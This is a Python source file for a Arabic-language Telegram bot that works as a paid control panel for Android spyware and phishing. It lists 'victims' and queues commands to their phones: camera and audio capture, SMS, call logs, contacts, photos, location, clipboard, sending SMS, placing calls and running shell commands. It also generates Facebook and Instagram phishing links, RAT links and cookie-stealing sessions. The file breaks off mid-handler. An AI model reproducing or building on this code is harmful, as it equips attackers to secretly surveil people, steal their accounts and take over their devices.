# bot_handlers.py
# ============================================================
# معالجات البوت الرئيسية: /start + callback + step handlers
# نسخة HTML (لا يوجد أخطاء Markdown) — v2
# ============================================================

import io
import html
import time
import threading
import requests
import uuid
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import (
    bot, redis_client, PUBLIC_URL, RAILWAY_URL,
    GITHUB_TOKEN, GITHUB_REPO,
)
from utils import trigger_victim_apk_build, get_victim_apk_url

from imports_manager import (
    get_or_create_user, can_use_tool, consume_usage,
    build_plans_keyboard, build_main_payment_keyboard,
    build_account_text, build_plans_text, send_invoice,
    PRICING_PLANS, FREE_TRIAL_USES, AVAILABLE_TOOLS,
    is_admin, is_vip, get_all_users, get_user, save_user,
    delete_user, ban_user, unban_user, activate_subscription,
    build_admin_menu, build_admin_users_keyboard,
    build_user_detail_keyboard, build_user_info_text,
    build_admin_stats_text,
    create_victim, get_victim, get_all_victims, delete_victim,
    update_victim_status, rename_victim,
    queue_victim_command,
    lsh_push_command,
    generate_qr_code_bytes, lsh_generate_qr,
    queue_command,
)

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("bot_handlers")


# ============================================================
# ★★★ Escape HTML ★★★
# ============================================================
def h(text):
    """Escape HTML characters"""
    if text is None:
        return ""
    return html.escape(str(text))


# ============================================================
# ★ متغيرات عامة
# ============================================================
_pending_open_url = {}


# ============================================================
# قوائم
# ============================================================
def main_menu(user_id=None):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
    markup.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))
    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
    markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
    markup.add(InlineKeyboardButton("🕹️ السيطرة الكاملة على الجلسة (LSH)", callback_data="gen_lsh"))
    markup.add(InlineKeyboardButton("🍪 سرقة الكوكيز والجلسات (SH)", callback_data="gen_sh"))
    markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
    markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    if user_id and is_admin(user_id):
        markup.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))
    return markup


def victim_commands_panel(victim_id):
    """لوحة التحكم الكاملة بالضحية — مع كل الأوامر الجديدة"""
    m = InlineKeyboardMarkup()

    # ═══════ الكاميرا ═══════
    m.row(
        InlineKeyboardButton("📷 كاميرا أمامية", callback_data=f"vcmd_camfront_{victim_id}"),
        InlineKeyboardButton("📸 كاميرا خلفية", callback_data=f"vcmd_camback_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🎥 فيديو أمامية 10s", callback_data=f"vcmd_videofront_{victim_id}"),
        InlineKeyboardButton("🎥 فيديو خلفية 10s", callback_data=f"vcmd_videoback_{victim_id}"),
    )

    # ═══════ الصوت ═══════
    m.row(
        InlineKeyboardButton("🎙️ تسجيل صوت 10s", callback_data=f"vcmd_audio_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🔔 نغمة", callback_data=f"vcmd_sound_{victim_id}"),
        InlineKeyboardButton("🚨 إنذار", callback_data=f"vcmd_alarm_{victim_id}"),
    )

    # ═══════ البيانات ═══════
    m.row(
        InlineKeyboardButton("📱 معلومات الجهاز", callback_data=f"vcmd_info_{victim_id}"),
        InlineKeyboardButton("🔋 البطارية", callback_data=f"vcmd_battery_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("📨 SMS", callback_data=f"vcmd_sms_{victim_id}"),
        InlineKeyboardButton("📞 سجل المكالمات", callback_data=f"vcmd_calls_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("👥 جهات الاتصال", callback_data=f"vcmd_contacts_{victim_id}"),
        InlineKeyboardButton("📲 التطبيقات", callback_data=f"vcmd_apps_{victim_id}"),
    )

    # ═══════ الوسائط ═══════
    m.row(
        InlineKeyboardButton("🖼️ الصور", callback_data=f"vcmd_photos_{victim_id}"),
        InlineKeyboardButton("🎬 الفيديوهات", callback_data=f"vcmd_videos_{victim_id}"),
    )

    # ═══════ الموقع والشبكة ═══════
    m.row(
        InlineKeyboardButton("📍 الموقع", callback_data=f"vcmd_location_{victim_id}"),
        InlineKeyboardButton("📶 معلومات WiFi", callback_data=f"vcmd_wifi_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("📋 الحافظة", callback_data=f"vcmd_clipboard_{victim_id}"),
    )

    # ═══════ التحكم ═══════
    m.row(
        InlineKeyboardButton("📳 اهتزاز", callback_data=f"vcmd_vibrate_{victim_id}"),
        InlineKeyboardButton("🔊 صوت أقصى", callback_data=f"vcmd_volmax_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🔉 خفض الصوت", callback_data=f"vcmd_volmute_{victim_id}"),
        InlineKeyboardButton("⚡ صوت متوسط", callback_data=f"vcmd_volmid_{victim_id}"),
    )

    # ═══════ الميديا ═══════
    m.row(
        InlineKeyboardButton("⏯️ تشغيل/إيقاف", callback_data=f"vcmd_mediaplay_{victim_id}"),
        InlineKeyboardButton("⏭️ التالي", callback_data=f"vcmd_medianext_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("⏮️ السابق", callback_data=f"vcmd_mediaprev_{victim_id}"),
    )

    # ═══════ الشاشة ═══════
    m.row(
        InlineKeyboardButton("🌑 إطفاء الشاشة", callback_data=f"vcmd_screenoff_{victim_id}"),
        InlineKeyboardButton("🔒 قفل كامل", callback_data=f"vcmd_lock_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🏠 الرئيسية", callback_data=f"vcmd_home_{victim_id}"),
    )

    # ═══════ التواصل ═══════
    m.row(
        InlineKeyboardButton("✉️ إرسال SMS", callback_data=f"vcmd_sendsms_{victim_id}"),
        InlineKeyboardButton("📞 مكالمة", callback_data=f"vcmd_call_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🌐 فتح رابط", callback_data=f"vcmd_url_{victim_id}"),
        InlineKeyboardButton("💬 Toast", callback_data=f"vcmd_toast_{victim_id}"),
    )

    # ═══════ متقدم ═══════
    m.row(
        InlineKeyboardButton("💻 Shell", callback_data=f"vcmd_shell_{victim_id}"),
    )

    # ═══════ الإدارة ═══════
    m.row(
        InlineKeyboardButton("🔄 تحديث", callback_data=f"v_refresh_{victim_id}"),
        InlineKeyboardButton("✏️ تغيير الاسم", callback_data=f"v_rename_{victim_id}"),
    )
    m.row(InlineKeyboardButton("🗑️ حذف الضحية", callback_data=f"v_delete_{victim_id}"))
    m.row(InlineKeyboardButton("🔙 رجوع للضحايا", callback_data="v_list"))

    return m


def _deny_message(reason, user_id, tool, data=None):
    data = data or {}
    if reason == "banned":
        return "🚫 <b>أنت محظور.</b>"
    if reason == "daily_limit_reached":
        return f"⚠️ <b>وصلت للحد اليومي</b> ({data.get('daily_limit', 0)})."
    if reason == "no_credit":
        return (
            "❌ <b>لا يوجد لديك استخدام متاح.</b>\n\n"
            f"🎁 حصلت على {FREE_TRIAL_USES} استخدام مجاني.\n"
            "💎 اشترك للاستمرار."
        )
    return "❌ لا يمكن استخدام الأداة."


# ============================================================
# /start
# ============================================================
@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    logger.info(f"/start from {message.from_user.id}")
    metrics.inc_counter("bot_commands", tags={"cmd": "start"})

    user_name = message.from_user.first_name
    try:
        get_or_create_user(
            message.from_user.id,
            message.from_user.username or "Unknown",
            user_name
        )
    except Exception as e:
        logger.exception(f"get_or_create_user error: {e}")

    if is_admin(message.from_user.id):
        text = (
            f"👑 <b>مرحباً أيها الأدمن {h(user_name)}!</b>\n\n"
            f"⚡ صلاحيات كاملة.\n"
            f"💎 VIP لا نهائي.\n\n"
            f"🎛️ استخدم اللوحة للتحكم."
        )
    else:
        text = (
            f"⚡ <b>مرحباً {h(user_name)}</b>\n\n"
            f"🎯 نظام إدارة الضحايا\n\n"
            f"📱 اضغط <b>إدارة الضحايا</b> للبدء"
        )

    bot.send_message(
        message.chat.id, text,
        parse_mode="HTML",
        reply_markup=main_menu(message.from_user.id)
    )


# ============================================================
# Callback Handler
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data

    try:
        _handle_callback(call, chat_id, user_id, data)
    except Exception as e:
        logger.exception(f"callback_handler error: {e}")
        metrics.inc_counter("bot_errors", tags={"type": "callback"})


def _handle_callback(call, chat_id, user_id, data):
    """المنطق الفعلي للـ callback"""

    # ============================================================
    # قائمة الضحايا
    # ============================================================
    if data == "v_list":
        bot.answer_callback_query(call.id)
        victims = get_all_victims(chat_id)

        m = InlineKeyboardMarkup()
        m.add(InlineKeyboardButton("➕ ضحية جديدة (APK)", callback_data="v_new"))

        if victims:
            m.add(InlineKeyboardButton(
                f"━━━ 📋 ضحاياي ({len(victims)}) ━━━",
                callback_data="noop"
            ))
            for v in victims[:15]:
                vid = v.get("victim_id", "")
                name = v.get("name", "?")[:18]
                status = v.get("status", "pending")
                icon = "🟢" if status == "active" else "⏸️"
                m.add(InlineKeyboardButton(
                    f"{icon} {name}",
                    callback_data=f"v_open_{vid}"
                ))

        text = (
            f"👥 <b>إدارة الضحايا</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>العدد:</b> <code>{len(victims)}</code>\n\n"
        )

        if not victims:
            text += "📭 <b>لا يوجد ضحايا بعد</b>\n\n💡 اضغط <b>➕ ضحية جديدة</b>"
        else:
            text += "👇 اختر ضحية للتحكم بها"

        bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=m)
        return

    # ============================================================
    # ضحية جديدة
    # ============================================================
    if data == "v_new":
        bot.answer_callback_query(call.id)
        check = can_use_tool(chat_id, "apk")
        if not check["allowed"]:
            bot.send_message(chat_id, "❌ لا يوجد رصيد. اشترك أولاً.",
                             reply_markup=build_main_payment_keyboard())
            return
        consume_usage(chat_id, "apk")

        msg = bot.send_message(
            chat_id,
            "📝 <b>إضافة ضحية جديدة</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "أرسل اسم الضحية (مثلاً: <code>أحمد</code>)\n\n"
            "⏱️ <i>لديك 60 ثانية</i>",
            parse_mode="HTML"
        )
        bot.register_next_step_handler(msg, victim_name_step)
        return

    # ============================================================
    # فتح ضحية
    # ============================================================
    if data.startswith("v_open_"):
        victim_id = data.replace("v_open_", "")
        victim = get_victim(chat_id, victim_id)
        if not victim:
            bot.answer_callback_query(call.id, "❌ غير موجودة", show_alert=True)
            return

        bot.answer_callback_query(call.id)

        name = victim.get("name", "?")
        status = victim.get("status", "pending")
        device_id = victim.get("device_id", "—")
        model = victim.get("model", "—")
        android = victim.get("android", "—")
        brand = victim.get("brand", "—")
        last_seen = victim.get("last_seen")

        status_icon = "🟢 متصل" if status == "active" else "⏸️ في انتظار التثبيت"
        last_str = "—"
        if last_seen:
            try:
                diff = time.time() - float(last_seen)
                if diff < 60:
                    last_str = f"قبل {int(diff)} ثانية"
                elif diff < 3600:
                    last_str = f"قبل {int(diff/60)} دقيقة"
                elif diff < 86400:
                    last_str = f"قبل {int(diff/3600)} ساعة"
                else:
                    last_str = f"قبل {int(diff/86400)} يوم"
            except Exception:
                pass

        text = (
            f"👤 <b>{h(name)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 الحالة: {status_icon}\n"
            f"📱 الجهاز: <code>{h(brand)} {h(model)}</code>\n"
            f"🤖 Android: <code>{h(android)}</code>\n"
            f"🆔 Device: <code>{h(device_id[:16]) if device_id else '—'}</code>\n"
            f"🕐 آخر ظهور: {last_str}\n\n"
            f"🎛️ <b>اختر الأمر:</b>"
        )

        bot.send_message(chat_id, text, parse_mode="HTML",
                         reply_markup=victim_commands_panel(victim_id))
        return

    # ============================================================
    # أوامر الضحية
    # ============================================================
    if data.startswith("vcmd_"):
        body = data.replace("vcmd_", "")
        parts = body.split("_")
        victim_id = parts[-1]
        action = "_".join(parts[:-1])

        victim = get_victim(chat_id, victim_id)
        if not victim:
            bot.answer_callback_query(call.id, "❌ ضحية غير موجودة", show_alert=True)
            return

        # ★ خريطة الأوامر الكاملة
        action_map = {
            # كاميرا
            "camfront": "camera_front",
            "camback": "camera_back",
            "videofront": "camera_record_front",
            "videoback": "camera_record_back",
            "video": "camera_record",

            # صوت
            "audio": "record_audio",
            "sound": "play_sound",
            "alarm": "play_alarm",

            # معلومات
            "info": "get_device_info",
            "battery": "get_battery",
            "sms": "get_sms",
            "calls": "get_call_log",
            "contacts": "get_contacts",
            "apps": "get_apps",
            "photos": "get_photos",
            "videos": "get_videos",
            "location": "get_location",
            "wifi": "get_wifi_info",
            "clipboard": "get_clipboard",

            # تحكم
            "vibrate": "vibrate",
            "volmax": "volume_max",
            "lock": "lock_screen",
            "home": "show_home",
            "screenoff": "screen_off",

            # ميديا
            "mediaplay": "media_play_pause",
            "medianext": "media_next",
            "mediaprev": "media_previous",
        }

        # ★ معالجة خاصة للصوت (levels)
        if action == "volmute":
            ok = queue_victim_command(victim_id, "volume_set",
                                       level=0, stream="music")
            if ok:
                bot.answer_callback_query(call.id, "🔉 تم خفض الصوت")
            else:
                bot.answer_callback_query(call.id, "❌ فشل", show_alert=True)
            return

        if action == "volmid":
            ok = queue_victim_command(victim_id, "volume_set",
                                       level=8, stream="music")
            if ok:
                bot.answer_callback_query(call.id, "🔉 تم ضبط الصوت")
            else:
                bot.answer_callback_query(call.id, "❌ فشل", show_alert=True)
            return

        if action in action_map:
            real_action = action_map[action]
            kwargs = {}

            if action in ("video", "videofront", "videoback"):
                kwargs["duration"] = 10000
            elif action == "audio":
                kwargs["duration"] = 10000
            elif action == "vibrate":
                kwargs["ms"] = 3000

            ok = queue_victim_command(victim_id, real_action, **kwargs)
            if ok:
                bot.answer_callback_query(call.id, "✅ تم الإرسال")
            else:
                bot.answer_callback_query(call.id, "❌ فشل الإرسال", show_alert=True)
            logger.info(f"Command: {action} → {victim_id[:8]}")
            return

        # ★ أوامر تحتاج إدخال نصي
        if action == "toast":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "💬 <b>أرسل النص:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: v_toast_step(m, victim_id))
            return

        if action == "shell":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "💻 <b>أرسل الأمر:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: v_shell_step(m, victim_id))
            return

        if action == "sendsms":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id,
                "✉️ <b>أرسل:</b> <code>رقم|نص</code>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: v_sendsms_step(m, victim_id))
            return

        if action == "call":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "📞 <b>أرسل الرقم:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: v_call_step(m, victim_id))
            return

        if action == "url":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "🌐 <b>أرسل الرابط:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: v_url_step(m, victim_id))
            return

        bot.answer_callback_query(call.id, f"❓ {action}", show_alert=True)
        return

    # ============================================================
    # تحديث / إعادة تسمية / حذف
    # ============================================================
    if data.startswith("v_refresh_"):
        victim_id = data.replace("v_refresh_", "")
        victim = get_victim(chat_id, victim_id)
        if victim:
            bot.answer_callback_query(call.id, "🔄 تم التحديث")
            bot.send_message(
                chat_id,
                f"👤 <b>{h(victim.get('name'))}</b>",
                reply_markup=victim_commands_panel(victim_id),
                parse_mode="HTML"
            )
        return

    if data.startswith("v_rename_"):
        victim_id = data.replace("v_rename_", "")
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "✏️ <b>أرسل الاسم الجديد:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, lambda m: v_rename_step(m, victim_id))
        return

    if data.startswith("v_delete_"):
        victim_id = data.replace("v_delete_", "")
        victim = get_victim(chat_id, victim_id)
        if not victim:
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        m = InlineKeyboardMarkup()
        m.row(
            InlineKeyboardButton("✅ نعم", callback_data=f"v_confirm_del_{victim_id}"),
            InlineKeyboardButton("❌ إلغاء", callback_data=f"v_open_{victim_id}"),
        )
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            f"⚠️ <b>حذف ضحية {h(victim.get('name'))}?</b>",
            reply_markup=m, parse_mode="HTML"
        )
        return

    if data.startswith("v_confirm_del_"):
        victim_id = data.replace("v_confirm_del_", "")
        delete_victim(chat_id, victim_id)
        bot.answer_callback_query(call.id, "🗑️ تم الحذف")
        bot.send_message(chat_id, "✅ تم الحذف")
        return

    # ============================================================
    # الدفع
    # ============================================================
    if data == "payment_menu":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "💎 <b>قسم الاشتراكات</b>",
                         reply_markup=build_main_payment_keyboard(),
                         parse_mode="HTML")
        return

    if data == "show_plans":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_plans_text(),
                         reply_markup=build_plans_keyboard(),
                         parse_mode="HTML")
        return

    if data.startswith("buy_plan_"):
        plan_key = data.replace("buy_plan_", "")
        bot.answer_callback_query(call.id, "جاري تجهيز الفاتورة...")
        send_invoice(bot, chat_id, plan_key)
        return

    if data == "my_account":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_account_text(chat_id), parse_mode="HTML")
        return

    if data == "back_to_main":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "القائمة الرئيسية:", reply_markup=main_menu(user_id))
        return

    if data == "noop":
        bot.answer_callback_query(call.id)
        return

    # ============================================================
    # الأدمن
    # ============================================================
    if data == "admin_panel":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "👑 <b>لوحة تحكم الأدمن</b>",
                         reply_markup=build_admin_menu(), parse_mode="HTML")
        return

    if data.startswith("admin_users_"):
        if not is_admin(user_id): return
        try:
            page = int(data.replace("admin_users_", ""))
        except ValueError:
            page = 0
        users = get_all_users()
        if not users:
            bot.answer_callback_query(call.id, "لا يوجد مستخدمون", show_alert=True)
            return
        users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, f"👥 <b>المستخدمون ({len(users)})</b>",
                         reply_markup=build_admin_users_keyboard(users, page),
                         parse_mode="HTML")
        return

    if data.startswith("admin_user_"):
        if not is_admin(user_id): return
        try:
            uid = int(data.replace("admin_user_", ""))
        except ValueError:
            return
        user = get_user(uid)
        if not user:
            bot.answer_callback_query(call.id, "❌ غير موجود", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_user_info_text(uid, user),
                         reply_markup=build_user_detail_keyboard(uid, user),
                         parse_mode="HTML")
        return

    if data.startswith("admin_ban_user_"):
        if not is_admin(user_id): return
        try:
            uid = int(data.replace("admin_ban_user_", ""))
        except ValueError:
            return
        ban_user(uid)
        bot.answer_callback_query(call.id, "✅ تم الحظر", show_alert=True)
        return

    if data.startswith("admin_unban_user_"):
        if not is_admin(user_id): return
        try:
            uid = int(data.replace("admin_unban_user_", ""))
        except ValueError:
            return
        unban_user(uid)
        bot.answer_callback_query(call.id, "✅ تم فك الحظر", show_alert=True)
        return

    if data.startswith("admin_grant_vip_user_"):
        if not is_admin(user_id): return
        try:
            uid = int(data.replace("admin_grant_vip_user_", ""))
        except ValueError:
            return
        u = get_or_create_user(uid)
        u["is_vip"] = True
        save_user(uid, u)
        bot.answer_callback_query(call.id, "💎 تم منح VIP", show_alert=True)
        try:
            bot.send_message(uid, "💎 <b>تهانينا!</b> VIP مُفعّل 🚀", parse_mode="HTML")
        except Exception as e:
            logger.warning(f"notify vip user error: {e}")
        return

    if data.startswith("admin_remove_vip_"):
        if not is_admin(user_id): return
        try:
            uid = int(data.replace("admin_remove_vip_", ""))
        except ValueError:
            return
        u = get_or_create_user(uid)
        u["is_vip"] = False
        save_user(uid, u)
        bot.answer_callback_query(call.id, "✅ تم إزالة VIP", show_alert=True)
        return

    if data.startswith("admin_delete_user_"):
        if not is_admin(user_id): return
        try:
            uid = int(data.replace("admin_delete_user_", ""))
        except ValueError:
            return
        delete_user(uid)
        bot.answer_callback_query(call.id, "🗑️ تم الحذف", show_alert=True)
        return

    if data.startswith("admin_give_sub_"):
        if not is_admin(user_id): return
        try:
            uid = int(data.replace("admin_give_sub_", ""))
        except ValueError:
            return
        bot.answer_callback_query(call.id)
        m = InlineKeyboardMarkup()
        m.row(
            InlineKeyboardButton("⭐ أساسية", callback_data=f"admin_activate_basic_{uid}"),
            InlineKeyboardButton("💎 احترافية", callback_data=f"admin_activate_pro_{uid}"),
        )
        m.row(InlineKeyboardButton("👑 VIP", callback_data=f"admin_activate_vip_{uid}"))
        m.row(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_user_{uid}"))
        bot.send_message(chat_id, f"📅 <b>اختر الباقة</b> <code>{uid}</code>",
                         reply_markup=m, parse_mode="HTML")
        return

    if data.startswith("admin_activate_"):
        if not is_admin(user_id): return
        parts = data.replace("admin_activate_", "").rsplit("_", 1)
        if len(parts) != 2: return
        plan_key, uid_str = parts
        try:
            uid = int(uid_str)
        except ValueError:
            return
        try:
            user = activate_subscription(uid, plan_key)
            plan = PRICING_PLANS.get(plan_key)
            bot.answer_callback_query(call.id, f"✅ {plan['name']}", show_alert=True)
            try:
                expires = datetime.fromisoformat(user["subscription"]["expires_at"])
                bot.send_message(uid,
                    f"🎉 <b>تم تفعيل اشتراكك!</b>\n📅 ينتهي: <code>{expires.strftime('%Y-%m-%d')}</code>",
                    parse_mode="HTML")
            except Exception as e:
                logger.warning(f"notify user subscription error: {e}")
        except Exception as e:
            logger.exception(f"activate_subscription error: {e}")
            bot.answer_callback_query(call.id, f"❌ {e}", show_alert=True)
        return

    if data == "admin_stats":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_admin_stats_text(),
                         reply_markup=InlineKeyboardMarkup().add(
                             InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
                         ), parse_mode="HTML")
        return

    if data == "admin_recent":
        if not is_admin(user_id): return
        users = get_all_users()
        users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
        lines = ["🆕 <b>آخر 10 مستخدمين:</b>"]
        for u in users[:10]:
            uid = u.get("user_id")
            name = u.get("first_name", "Unknown")
            icon = "👑" if is_admin(uid) else "💎" if u.get("is_vip") else "🚫" if u.get("is_banned") else "👤"
            lines.append(f"{icon} <b>{h(name)}</b> — <code>{uid}</code>")
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "\n".join(lines),
                         reply_markup=InlineKeyboardMarkup().add(
                             InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
                         ), parse_mode="HTML")
        return

    if data == "admin_search":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "🔍 <b>أرسل ID أو username:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_search_handler)
        return

    if data == "admin_broadcast":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "📢 <b>أرسل الرسالة:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_broadcast_handler)
        return

    if data == "admin_ban":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "🚫 <b>أرسل ID للحظر:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_ban_handler)
        return

    if data == "admin_unban":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "✅ <b>أرسل ID لفك الحظر:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_unban_handler)
        return

    if data == "admin_delete":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "🗑️ <b>أرسل ID للحذف:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_delete_handler)
        return

    if data == "admin_grant_vip":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "💎 <b>أرسل ID لمنح VIP:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_grant_vip_handler)
        return

    if data == "admin_give_stars":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "⭐ <b>أرسل:</b> <code>user_id|amount</code>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_give_stars_handler)
        return

    if data.startswith("admin_msg_user_"):
        if not is_admin(user_id): return
        try:
            uid = int(data.replace("admin_msg_user_", ""))
        except ValueError:
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, f"📨 <b>أرسل الرسالة لـ</b> <code>{uid}</code>:", parse_mode="HTML")
        bot.register_next_step_handler(msg, lambda m, u=uid: admin_msg_user_handler(m, u))
        return

    # ============================================================
    # فيسبوك
    # ============================================================
    if data == "gen_fb":
        check = can_use_tool(chat_id, "fb")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "fb", check),
                             parse_mode="HTML")
            return
        consume_usage(chat_id, "fb")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        link = f"{PUBLIC_URL}/login.php?id={chat_id}"
        bot.send_message(chat_id, f"🎯 رابط فيسبوك:\n<code>{h(link)}</code>", parse_mode="HTML")
        return

    # ============================================================
    # انستقرام
    # ============================================================
    if data == "gen_ig":
        check = can_use_tool(chat_id, "ig")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "ig", check),
                             parse_mode="HTML")
            return
        consume_usage(chat_id, "ig")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        link = f"{PUBLIC_URL}/ig_login.php?id={chat_id}"
        bot.send_message(chat_id, f"📸 رابط انستقرام:\n<code>{h(link)}</code>", parse_mode="HTML")
        return

    # ============================================================
    # RAT
    # ============================================================
    if data == "gen_rat":
        check = can_use_tool(chat_id, "rat")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "rat", check),
                             parse_mode="HTML")
            return
        consume_usage(chat_id, "rat")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        link = f"{PUBLIC_URL}/system_secure_v2?id={chat_id}"
        bot.send_message(chat_id, f"📱 رابط RAT:\n<code>{h(link)}</code>", parse_mode="HTML")
        return

    # ============================================================
    # QR
    # ============================================================
    if data == "gen_qr":
        check = can_use_tool(chat_id, "qr")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "qr", check),
                             parse_mode="HTML")
            return
        consume_usage(chat_id, "qr")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        token = str(uuid.uuid4())[:8]
        if redis_client:
            try:
                redis_client.setex(f"qr_token:{token}", 300, chat_id)
            except Exception as e:
                logger.warning(f"redis setex qr_token error: {e}")
        target_link = f"{PUBLIC_URL}/qr_scan_target?token={token}"
        qr_image = generate_qr_code_bytes(target_link)
        if qr_image:
            qr_image.name = 'pairing_qr.jpg'
            bot.send_photo(chat_id, qr_image,
                           caption="📷 <b>امسح الـ QR:</b>", parse_mode="HTML")
        else:
            bot.send_message(chat_id, f"🎯 رابط QR:\n<code>{h(target_link)}</code>", parse_mode="HTML")
        return

    # ============================================================
    # LSH
    # ============================================================
    if data == "gen_lsh":
        check = can_use_tool(chat_id, "lsh")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "lsh", check),
                             parse_mode="HTML")
            return
        consume_usage(chat_id, "lsh")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        session_id = str(uuid.uuid4()).replace('-', '')[:24]
        if redis_client:
            try:
                redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
            except Exception as e:
                logger.warning(f"redis setex lsh_session error: {e}")
        try:
            requests.post(f"{PUBLIC_URL}/lsh_create",
                          json={"chat_id": chat_id, "session_id": session_id}, timeout=5)
        except Exception as e:
            logger.warning(f"lsh_create POST error: {e}")
        target_link = f"{PUBLIC_URL}/lsh?s={session_id}&id={chat_id}"
        qr_image = lsh_generate_qr(target_link)
        if qr_image:
            qr_image.name = 'lsh_qr.png'
            try:
                bot.send_photo(chat_id, qr_image,
                               caption=f"🕹️ <b>جلسة LSH جاهزة!</b>\n<code>{h(target_link)}</code>",
                               parse_mode="HTML")
            except Exception:
                bot.send_message(chat_id, f"🕹️ <code>{h(target_link)}</code>", parse_mode="HTML")
        else:
            bot.send_message(chat_id, f"🕹️ <code>{h(target_link)}</code>", parse_mode="HTML")
        return

    # ============================================================
    # Session Hunter
    # ============================================================
    if data == "gen_sh":
        check = can_use_tool(chat_id, "sh")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
